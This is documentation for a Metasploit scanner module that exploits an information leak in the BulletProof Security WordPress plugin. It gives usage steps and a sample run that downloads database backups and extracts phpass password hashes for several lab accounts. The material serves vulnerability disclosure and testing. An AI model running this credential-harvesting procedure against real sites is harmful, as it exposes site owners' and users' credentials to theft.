## Vulnerable Application

The Wordpress plugin BulletProof Security, versions <= 5.1, suffers from an information disclosure
vulnerability, in that the `db_backup_log.txt` is publicly accessible.  If the backup functionality
is being utilized, this file will disclose where the backup files can be downloaded.
After downloading the backup file, it will be parsed to grab all user credentials.

Download it from [here](https://downloads.wordpress.org/plugin/bulletproof-security.5.1.zip)

## Verification Steps

1. Install the plugin, create a backup job, and manually run it.
1. Start msfconsole
1. Do: `use auxiliary/scanner/http/wp_bulletproofsecurity_backups`
1. Do: `set rhosts [ip]`
1. Do: `run`
1. You should find database backup log files.

## Options

## Scenarios

### Wordpress 5.4.4 with BulletProof Security 5.1

```
[*] Using auxiliary/scanner/http/wp_bulletproofsecurity_backups
resource (bulletproof.rb)> set rhosts 111.111.1.111
rhosts => 111.111.1.111
resource (bulletproof.rb)> set verbose true
verbose => true
resource (bulletproof.rb)> run
[*] Checking if target is online and running Wordpress...
[*] Checking plugin installed and vulnerable
[*] Checking /wp-content/plugins/bulletproof-security/readme.txt
[*] Found version 5.1 in the plugin
[*] Requesting Backup files
[+] Stored db_backup_log.txt to /home/h00die/.msf4/loot/20211012183149_default_111.111.1.111_db_backup_log.tx_935521.txt, size: 12106
[*] Pulling: /wp-content/bps-backup/backups_bd4aBHlhN9ODGQq/2021-10-11-time-8-35-42-pm.zip
[+] Stored DB Backup 2021-10-11-time-8-35-42-pm.zip to /home/h00die/.msf4/loot/20211012183149_default_111.111.1.111_20211011time_891612.zip, size: 354673
[*] Found user line: VALUES ( 1, 'admin', '$P$BZlPX7NIx8MYpXokBW2AGsN7i.aUOt0', 'admin', 'none@localhost.com', 'http://111.111.1.111', '2020-05-30 12:39:48', '1608323285:$P$B9FDhsfhTLZfvAKt8dbgOrs5CoHDUr/', 0, 'admin' );
[+]   Extracted user content: admin -> $P$BZlPX7NIx8MYpXokBW2AGsN7i.aUOt0
[*] Found user line: VALUES ( 2, 'editor', '$P$BdWSGpy/tzJomNCh30a67oJuBEcW0K/', 'editor', 'none@none.com', '', '2020-10-27 23:49:32', '1607478044:$P$BZ1kwDNNxe5QJ6ibiU4yPIBC8X5Mhv.', 0, 'editor' );
[+]   Extracted user content: editor -> $P$BdWSGpy/tzJomNCh30a67oJuBEcW0K/
[*] Found user line: VALUES ( 3, 'admin2', '$P$BNS2BGBTJmjIgV0nZWxAZtRfq1l19p1', 'admin2', 'none2@none.com', '', '2020-10-27 23:49:57', '', 0, 'admin2' );
[+]   Extracted user content: admin2 -> $P$BNS2BGBTJmjIgV0nZWxAZtRfq1l19p1
[*] Found user line: VALUES ( 4, 'user', '$P$BR0Gg0bGfjfoywsVOQy1drT/7t6epE0', 'user', 'user@none.com', '', '2021-08-22 13:58:04', '', 0, 'user user' );
[+]   Extracted user content: user -> $P$BR0Gg0bGfjfoywsVOQy1drT/7t6epE0
[*] Pulling: /wp-content/bps-backup/backups_bd4aBHlhN9ODGQq/2021-10-11-time-8-35-42-pm.zip
[+] Stored DB Backup 2021-10-11-time-8-35-42-pm.zip to /home/h00die/.msf4/loot/20211012183150_default_111.111.1.111_20211011time_324844.zip, size: 354673
[*] Found user line: VALUES ( 1, 'admin', '$P$BZlPX7NIx8MYpXokBW2AGsN7i.aUOt0', 'admin', 'none@localhost.com', 'http://111.111.1.111', '2020-05-30 12:39:48', '1608323285:$P$B9FDhsfhTLZfvAKt8dbgOrs5CoHDUr/', 0, 'admin' );
[+]   Extracted user content: admin -> $P$BZlPX7NIx8MYpXokBW2AGsN7i.aUOt0
[*] Found user line: VALUES ( 2, 'editor', '$P$BdWSGpy/tzJomNCh30a67oJuBEcW0K/', 'editor', 'none@none.com', '', '2020-10-27 23:49:32', '1607478044:$P$BZ1kwDNNxe5QJ6ibiU4yPIBC8X5Mhv.', 0, 'editor' );
[+]   Extracted user content: editor -> $P$BdWSGpy/tzJomNCh30a67oJuBEcW0K/
[*] Found user line: VALUES ( 3, 'admin2', '$P$BNS2BGBTJmjIgV0nZWxAZtRfq1l19p1', 'admin2', 'none2@none.com', '', '2020-10-27 23:49:57', '', 0, 'admin2' );
[+]   Extracted user content: admin2 -> $P$BNS2BGBTJmjIgV0nZWxAZtRfq1l19p1
[*] Found user line: VALUES ( 4, 'user', '$P$BR0Gg0bGfjfoywsVOQy1drT/7t6epE0', 'user', 'user@none.com', '', '2021-08-22 13:58:04', '', 0, 'user user' );
[+]   Extracted user content: user -> $P$BR0Gg0bGfjfoywsVOQy1drT/7t6epE0
[*] Pulling: /wp-content/bps-backup/backups_bd4aBHlhN9ODGQq/2021-10-11-time-8-35-42-pm.zip
[+] Stored DB Backup 2021-10-11-time-8-35-42-pm.zip to /home/h00die/.msf4/loot/20211012183150_default_111.111.1.111_20211011time_664814.zip, size: 354673
[*] Found user line: VALUES ( 1, 'admin', '$P$BZlPX7NIx8MYpXokBW2AGsN7i.aUOt0', 'admin', 'none@localhost.com', 'http://111.111.1.111', '2020-05-30 12:39:48', '1608323285:$P$B9FDhsfhTLZfvAKt8dbgOrs5CoHDUr/', 0, 'admin' );
[+]   Extracted user content: admin -> $P$BZlPX7NIx8MYpXokBW2AGsN7i.aUOt0
[*] Found user line: VALUES ( 2, 'editor', '$P$BdWSGpy/tzJomNCh30a67oJuBEcW0K/', 'editor', 'none@none.com', '', '2020-10-27 23:49:32', '1607478044:$P$BZ1kwDNNxe5QJ6ibiU4yPIBC8X5Mhv.', 0, 'editor' );
[+]   Extracted user content: editor -> $P$BdWSGpy/tzJomNCh30a67oJuBEcW0K/
[*] Found user line: VALUES ( 3, 'admin2', '$P$BNS2BGBTJmjIgV0nZWxAZtRfq1l19p1', 'admin2', 'none2@none.com', '', '2020-10-27 23:49:57', '', 0, 'admin2' );
[+]   Extracted user content: admin2 -> $P$BNS2BGBTJmjIgV0nZWxAZtRfq1l19p1
[*] Found user line: VALUES ( 4, 'user', '$P$BR0Gg0bGfjfoywsVOQy1drT/7t6epE0', 'user', 'user@none.com', '', '2021-08-22 13:58:04', '', 0, 'user user' );
[+]   Extracted user content: user -> $P$BR0Gg0bGfjfoywsVOQy1drT/7t6epE0
[-] /wp-content/plugins/bulletproof-security/admin/htaccess/db_backup_log.txt not found on server or no data
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/wp_bulletproofsecurity_backups) > creds
Credentials
===========

host           origin         service             public  private                             realm  private_type        JtR Format
----           ------         -------             ------  -------                             -----  ------------        ----------
111.111.1.111  111.111.1.111  80/tcp (Wordpress)  admin   $P$BZlPX7NIx8MYpXokBW2AGsN7i.aUOt0         Nonreplayable hash  phpass
111.111.1.111  111.111.1.111  80/tcp (Wordpress)  editor  $P$BdWSGpy/tzJomNCh30a67oJuBEcW0K/         Nonreplayable hash  phpass
111.111.1.111  111.111.1.111  80/tcp (Wordpress)  admin2  $P$BNS2BGBTJmjIgV0nZWxAZtRfq1l19p1         Nonreplayable hash  phpass
111.111.1.111  111.111.1.111  80/tcp (Wordpress)  user    $P$BR0Gg0bGfjfoywsVOQy1drT/7t6epE0         Nonreplayable hash  phpass
```
